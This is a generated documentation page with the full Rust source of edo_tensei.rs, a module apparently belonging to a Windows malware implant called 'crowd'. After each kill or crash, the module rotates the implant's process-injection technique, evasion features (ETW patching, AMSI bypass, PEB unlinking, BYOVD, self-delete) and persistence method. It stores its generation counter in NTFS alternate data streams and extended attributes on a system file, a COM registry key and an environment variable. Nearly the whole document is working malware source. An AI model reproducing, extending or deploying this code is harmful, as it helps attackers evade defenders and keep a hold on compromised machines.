# crowd — edo_tensei.rs  (Polymorphic Resurrection Engine)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/edo_tensei.rs` |
| **Lines** | 405 |
| **Cards** | T014-edo-tensei |
| **Role** | Polymorphic resurrection engine |
| **Unsafe blocks** | 6 |
| **Feature gates** | megadebug |

## Purpose

# crowd — edo_tensei.rs  (Polymorphic Resurrection Engine)

## Edo Tensei — technique-stack resurrection across process deaths

When crowd.exe is killed or crashes, the persistence layer restarts it.
On restart, Edo Tensei reads the current "generation" index from soul
storage and applies that generation's technique stack to ChainConfig,
producing a different behavioral fingerprint each time.

### Soul Storage backends
- `ntfs_ea`:  NTFS Extended Attributes on kernel32.dll.mui
- `registry`: HKCU\Software\Classes\CLSID\{...}\InprocServer32 (Version subkey)
- `env_var`:  Per-user environment variable (%CROWD_GEN%)
- `ads`:      NTFS Alternate Data Stream on a system file

### Generation cycle
```text
Gen 0: threadless + etw + sleep_3000 + com_hijack
Gen 1: early_bird + amsi_hbp + sleep_5000 + ntfs_ea
Gen 2: dirty_vanity + peb_unlink + sleep_2000 + schtask
...wraps around to Gen 0 after max_generations
```

## Constants

- `SOUL_EA_NAME`: `&str` = `"CrowdEdoGenIdx"`
- `SOUL_REG_SUBKEY`: `&str` = `r"Software\Classes\CLSID\{b4bab081-ef08-11e3-848d-b8e856428d4f}\Config"`
- `SOUL_REG_VALUE`: `&str` = `"Generation"`
- `SOUL_ENV_VAR`: `&str` = `"CROWD_GEN"`
- `SOUL_ADS_TARGET`: `&str` = `r"C:\Windows\System32\en-US\kernel32.dll.mui"`
- `SOUL_ADS_STREAM`: `&str` = `":CrowdGen"`

## Public API

### `is_active` (line 62)
```rust
pub fn is_active() -> bool
```
Check if Edo Tensei is active and should override ChainConfig.
Called from main.rs before FSM dispatch.

### `apply_resurrection` (line 70)
```rust
pub fn apply_resurrection(cfg: &mut ChainConfig) -> u32
```
Read current generation index from soul storage, apply overrides
to the given ChainConfig, then advance and persist the next gen.

Returns the generation index that was applied (for logging).

## Internal Functions

- `apply_generation` — Apply a specific generation's technique stack to ChainConfig. (line 90)
- `parse_injection_method` — Parse injection method string to enum variant. (line 116)
- `apply_evasion_overrides` — Apply evasion toggle overrides from a comma-separated string. (line 144)
- `apply_syscall_backend` — Override syscall dispatch backend. (line 197)
- `read_generation` (line 209)
- `read_gen_ntfs_ea` (line 219)
- `read_gen_registry` (line 226)
- `read_gen_registry_inner` (unsafe) (line 230)
- `read_gen_env_var` (line 273)
- `read_gen_ads` (line 280)
- `parse_gen_bytes` (line 288)
- `write_generation` (line 301)
- `write_gen_ntfs_ea` (line 311)
- `write_gen_registry` (line 316)
- `write_gen_registry_inner` (unsafe) (line 320)
- `write_gen_env_var` (line 360)
- `write_env_var_persistent` (unsafe) (line 366)
- `write_gen_ads` (line 402)

## Key Dependencies

- `use crate::chain::{ChainConfig, InjectionMethod};`

## Full Source

```rust
//! # crowd — edo_tensei.rs  (Polymorphic Resurrection Engine)
//!
//! ## Edo Tensei — technique-stack resurrection across process deaths
//!
//! When crowd.exe is killed or crashes, the persistence layer restarts it.
//! On restart, Edo Tensei reads the current "generation" index from soul
//! storage and applies that generation's technique stack to ChainConfig,
//! producing a different behavioral fingerprint each time.
//!
//! ### Soul Storage backends
//! - `ntfs_ea`:  NTFS Extended Attributes on kernel32.dll.mui
//! - `registry`: HKCU\Software\Classes\CLSID\{...}\InprocServer32 (Version subkey)
//! - `env_var`:  Per-user environment variable (%CROWD_GEN%)
//! - `ads`:      NTFS Alternate Data Stream on a system file
//!
//! ### Generation cycle
//! ```text
//! Gen 0: threadless + etw + sleep_3000 + com_hijack
//! Gen 1: early_bird + amsi_hbp + sleep_5000 + ntfs_ea
//! Gen 2: dirty_vanity + peb_unlink + sleep_2000 + schtask
//! ...wraps around to Gen 0 after max_generations
//! ```

#![allow(dead_code)]

use crate::chain::{ChainConfig, InjectionMethod};

// ── Compile-time constants (injected by crowd_builder.py) ──────────────────

/// Whether Edo Tensei resurrection is enabled for this build.
pub use crate::payload_cfg::EDO_ENABLED;

/// Maximum number of generations before wrapping to 0.
pub use crate::payload_cfg::EDO_MAX_GENERATIONS;

/// Soul storage backend identifier.
pub use crate::payload_cfg::EDO_SOUL_STORAGE;

/// Number of generations in the chain.
pub use crate::payload_cfg::EDO_CHAIN_LEN;

// Per-generation arrays (parallel arrays — index = generation number)
pub use crate::payload_cfg::EDO_INJECTION;
pub use crate::payload_cfg::EDO_EVASION;
pub use crate::payload_cfg::EDO_SYSCALL_BACKEND;
pub use crate::payload_cfg::EDO_PERSIST_METHOD;
pub use crate::payload_cfg::EDO_SLEEP_MS;

// ── Soul storage magic ────────────────────────────────────────────────────

const SOUL_EA_NAME: &str = "CrowdEdoGenIdx";
const SOUL_REG_SUBKEY: &str = r"Software\Classes\CLSID\{b4bab081-ef08-11e3-848d-b8e856428d4f}\Config";
const SOUL_REG_VALUE: &str = "Generation";
const SOUL_ENV_VAR: &str = "CROWD_GEN";
const SOUL_ADS_TARGET: &str = r"C:\Windows\System32\en-US\kernel32.dll.mui";
const SOUL_ADS_STREAM: &str = ":CrowdGen";

// ── Public API ────────────────────────────────────────────────────────────

/// Check if Edo Tensei is active and should override ChainConfig.
/// Called from main.rs before FSM dispatch.
pub fn is_active() -> bool {
    EDO_ENABLED && EDO_CHAIN_LEN > 0
}

/// Read current generation index from soul storage, apply overrides
/// to the given ChainConfig, then advance and persist the next gen.
///
/// Returns the generation index that was applied (for logging).
pub fn apply_resurrection(cfg: &mut ChainConfig) -> u32 {
    let gen = read_generation();
    let idx = (gen as usize) % EDO_CHAIN_LEN;

    apply_generation(cfg, idx);

    // Advance to next generation for the next resurrection
    let next_gen = if gen + 1 >= EDO_MAX_GENERATIONS { 0 } else { gen + 1 };
    write_generation(next_gen);

    #[cfg(feature = "megadebug")]
    crate::mega_dbg!(
        "EdoTensei: gen={} idx={} injection='{}' sleep={}ms next_gen={}",
        gen, idx, EDO_INJECTION[idx], EDO_SLEEP_MS[idx], next_gen
    );

    gen
}

/// Apply a specific generation's technique stack to ChainConfig.
fn apply_generation(cfg: &mut ChainConfig, idx: usize) {
    // Injection method override
    cfg.injection_method = parse_injection_method(EDO_INJECTION[idx]);

    // Sleep timing
    if EDO_SLEEP_MS[idx] > 0 {
        cfg.sleep_ms = EDO_SLEEP_MS[idx];
    }

    // Persist method override
    let persist_method = EDO_PERSIST_METHOD[idx];
    if !persist_method.is_empty() {
        cfg.persist = true;
        cfg.persist_cfg
            .get_or_insert_with(crate::persist::PersistConfig::default)
            .methods = vec![persist_method.to_string()];
    }

    // Evasion toggles — parse comma-separated evasion IDs
    apply_evasion_overrides(cfg, EDO_EVASION[idx]);

    // Syscall backend override
    apply_syscall_backend(cfg, EDO_SYSCALL_BACKEND[idx]);
}

/// Parse injection method string to enum variant.
fn parse_injection_method(s: &str) -> InjectionMethod {
    match s {
        "threadless"            => InjectionMethod::Auto,
        "early_bird"            => InjectionMethod::EarlyBird,
        "early_bird_ppid"       => InjectionMethod::EarlyBirdPpid,
        "hypnosis"              => InjectionMethod::Hypnosis,
        "dirty_vanity"          => InjectionMethod::DirtyVanity,
        "herpaderping"          => InjectionMethod::Herpaderping,
        "ghost"                 => InjectionMethod::Phantom,
        "module_stomp"          => InjectionMethod::ModuleStomp,
        "func_stomp"            => InjectionMethod::Auto,
        "proxy_dll"             => InjectionMethod::ProxyDll,
        "ki_step_over"          => InjectionMethod::KiStepOver,
        "early_cascade"         => InjectionMethod::EarlyCascade,
        "mapping_inject"        => InjectionMethod::MappingInject,
        "waiting_thread_hijack" | "waiting_thread" => InjectionMethod::WaitingThreadHijack,
        "nt_create_process"     => InjectionMethod::NtCreateProcess,
        "reflective_pe" | "pe_loader" => InjectionMethod::ReflectivePe,
        "pool_party"            => InjectionMethod::PoolParty,
        "overload"              => InjectionMethod::Overload,
        "phantom"               => InjectionMethod::Phantom,
        _                       => InjectionMethod::Auto,
    }
}

/// Apply evasion toggle overrides from a comma-separated string.
/// Each ID in the string enables the corresponding toggle; all others
/// are left at their current value (from payload_cfg defaults).
fn apply_evasion_overrides(cfg: &mut ChainConfig, evasion_csv: &str) {
    if evasion_csv.is_empty() {
        return;
    }

    let ids: Vec<&str> = evasion_csv.split(',').map(|s| s.trim()).collect();

    // Reset all toggleable evasions to false, then enable only the listed ones
    cfg.patch_etw       = false;
    cfg.anti_vm         = false;
    cfg.self_delete     = false;
    cfg.stomp_own_header = false;
    cfg.peb_unlink      = false;
    cfg.block_handle    = false;
    cfg.use_threadless  = false;
    cfg.amsi_page_guard = false;
    cfg.hells_gate      = false;
    cfg.veh_syscalls    = false;
    cfg.byovd_enabled   = false;

    for id in ids {
        match id {
            "etw"            => cfg.patch_etw       = true,
            "anti_vm"        => cfg.anti_vm         = true,
            "self_delete"    => cfg.self_delete      = true,
            "stomp_header" | "stomp" => cfg.stomp_own_header = true,
            "peb_unlink"     => cfg.peb_unlink       = true,
            "block_handle"   => cfg.block_handle     = true,
            "threadless"     => cfg.use_threadless   = true,
            "amsi_page_guard"=> cfg.amsi_page_guard  = true,
            "amsi_hbp"       => { /* always active via DR0 — no runtime toggle */ }
            "hells_gate"     => cfg.hells_gate       = true,
            "veh_syscalls"   => cfg.veh_syscalls     = true,
            "byovd"          => cfg.byovd_enabled    = true,
            "sleep"          => { /* sleep timing controlled by EDO_SLEEP_MS */ }
            "hammering"      => { cfg.hammer_seed = 0x1337_cafe; }
            "block_dll" | "policy" => { /* applied at process creation via PPID setup */ }
            "iat_camo"       => { cfg.iat_camo_profile = 5; }
            "ppid"           => { cfg.ppid_parent = Some(0); }
            "stack_spoof"    => { /* always active — hardcoded spoof_caller() in chain.rs */ }
            "proxy_dll"      => { /* injection-mode technique, not a runtime toggle */ }
            "hypnosis"       => { /* injection-mode technique, not a runtime toggle */ }
            "ki_step_over"   => { /* pre-treatment technique, applied if injection == KiStepOver */ }
            "arg_spoof"      => { /* controlled by decoy_args/real_args in ChainConfig */ }
            _                => {
                #[cfg(feature = "megadebug")]
                crate::mega_dbg!("EdoTensei: unknown evasion_id '{}' — skipped", id);
            }
        }
    }
}

/// Override syscall dispatch backend.
fn apply_syscall_backend(cfg: &mut ChainConfig, backend: &str) {
    match backend {
        "recycled"   => { cfg.veh_syscalls = false; cfg.hells_gate = false; }
        "veh_gate"   => { cfg.veh_syscalls = true;  cfg.hells_gate = false; }
        "hells_gate" => { cfg.hells_gate = true;    cfg.veh_syscalls = false; }
        "direct"     => { cfg.veh_syscalls = false; cfg.hells_gate = false; }
        _            => {}
    }
}

// ── Soul Storage: Read ────────────────────────────────────────────────────

fn read_generation() -> u32 {
    match EDO_SOUL_STORAGE {
        "ntfs_ea"  => read_gen_ntfs_ea(),
        "registry" => read_gen_registry(),
        "env_var"  => read_gen_env_var(),
        "ads"      => read_gen_ads(),
        _          => 0,
    }
}

fn read_gen_ntfs_ea() -> u32 {
    match crate::persist::ntfs_ea::read_dropper_ea() {
        Ok(data) => parse_gen_bytes(&data),
        Err(_) => 0,
    }
}

fn read_gen_registry() -> u32 {
    unsafe { read_gen_registry_inner() }
}

unsafe fn read_gen_registry_inner() -> u32 {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;

    let subkey: Vec<u16> = OsStr::new(SOUL_REG_SUBKEY)
        .encode_wide().chain(Some(0)).collect();
    let value_name: Vec<u16> = OsStr::new(SOUL_REG_VALUE)
        .encode_wide().chain(Some(0)).collect();

    let mut hkey: winapi::shared::minwindef::HKEY = null_mut();
    let status = winapi::um::winreg::RegOpenKeyExW(
        winapi::um::winreg::HKEY_CURRENT_USER,
        subkey.as_ptr(),
        0,
        winapi::um::winnt::KEY_READ,
        &mut hkey,
    );

    if status != 0 || hkey.is_null() {
        return 0;
    }

    let mut data: u32 = 0;
    let mut data_size: u32 = 4;
    let mut data_type: u32 = 0;
    let status = winapi::um::winreg::RegQueryValueExW(
        hkey,
        value_name.as_ptr(),
        null_mut(),
        &mut data_type,
        &mut data as *mut u32 as *mut u8,
        &mut data_size,
    );
    winapi::um::winreg::RegCloseKey(hkey);

    if status == 0 && data_type == winapi::um::winnt::REG_DWORD {
        data
    } else {
        0
    }
}

fn read_gen_env_var() -> u32 {
    std::env::var(SOUL_ENV_VAR)
        .ok()
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0)
}

fn read_gen_ads() -> u32 {
    let path = format!("{}{}", SOUL_ADS_TARGET, SOUL_ADS_STREAM);
    std::fs::read(&path)
        .ok()
        .map(|data| parse_gen_bytes(&data))
        .unwrap_or(0)
}

fn parse_gen_bytes(data: &[u8]) -> u32 {
    // Accept either a 4-byte LE u32 or an ASCII decimal string
    if data.len() == 4 {
        u32::from_le_bytes([data[0], data[1], data[2], data[3]])
    } else if let Ok(s) = std::str::from_utf8(data) {
        s.trim().parse::<u32>().unwrap_or(0)
    } else {
        0
    }
}

// ── Soul Storage: Write ───────────────────────────────────────────────────

fn write_generation(gen: u32) {
    match EDO_SOUL_STORAGE {
        "ntfs_ea"  => write_gen_ntfs_ea(gen),
        "registry" => write_gen_registry(gen),
        "env_var"  => write_gen_env_var(gen),
        "ads"      => write_gen_ads(gen),
        _          => {}
    }
}

fn write_gen_ntfs_ea(gen: u32) {
    let bytes = gen.to_le_bytes();
    let _ = crate::persist::ntfs_ea::store_dropper_ea(&bytes);
}

fn write_gen_registry(gen: u32) {
    unsafe { write_gen_registry_inner(gen); }
}

unsafe fn write_gen_registry_inner(gen: u32) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;

    let subkey: Vec<u16> = OsStr::new(SOUL_REG_SUBKEY)
        .encode_wide().chain(Some(0)).collect();
    let value_name: Vec<u16> = OsStr::new(SOUL_REG_VALUE)
        .encode_wide().chain(Some(0)).collect();

    let mut hkey: winapi::shared::minwindef::HKEY = null_mut();
    let mut disposition: u32 = 0;
    let status = winapi::um::winreg::RegCreateKeyExW(
        winapi::um::winreg::HKEY_CURRENT_USER,
        subkey.as_ptr(),
        0,
        null_mut(),
        0,
        winapi::um::winnt::KEY_WRITE,
        null_mut(),
        &mut hkey,
        &mut disposition,
    );

    if status != 0 || hkey.is_null() {
        return;
    }

    let data = gen.to_le_bytes();
    winapi::um::winreg::RegSetValueExW(
        hkey,
        value_name.as_ptr(),
        0,
        winapi::um::winnt::REG_DWORD,
        data.as_ptr(),
        4,
    );
    winapi::um::winreg::RegCloseKey(hkey);
}

fn write_gen_env_var(gen: u32) {
    std::env::set_var(SOUL_ENV_VAR, gen.to_string());
    // Also persist via registry for cross-process survival
    unsafe { write_env_var_persistent(gen); }
}

unsafe fn write_env_var_persistent(gen: u32) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;

    let subkey: Vec<u16> = OsStr::new("Environment")
        .encode_wide().chain(Some(0)).collect();
    let value_name: Vec<u16> = OsStr::new(SOUL_ENV_VAR)
        .encode_wide().chain(Some(0)).collect();
    let value_data: Vec<u16> = OsStr::new(&gen.to_string())
        .encode_wide().chain(Some(0)).collect();

    let mut hkey: winapi::shared::minwindef::HKEY = null_mut();
    let status = winapi::um::winreg::RegOpenKeyExW(
        winapi::um::winreg::HKEY_CURRENT_USER,
        subkey.as_ptr(),
        0,
        winapi::um::winnt::KEY_WRITE,
        &mut hkey,
    );

    if status != 0 || hkey.is_null() {
        return;
    }

    winapi::um::winreg::RegSetValueExW(
        hkey,
        value_name.as_ptr(),
        0,
        winapi::um::winnt::REG_SZ,
        value_data.as_ptr() as *const u8,
        (value_data.len() * 2) as u32,
    );
    winapi::um::winreg::RegCloseKey(hkey);
}

fn write_gen_ads(gen: u32) {
    let path = format!("{}{}", SOUL_ADS_TARGET, SOUL_ADS_STREAM);
    let _ = std::fs::write(&path, gen.to_le_bytes());
}

```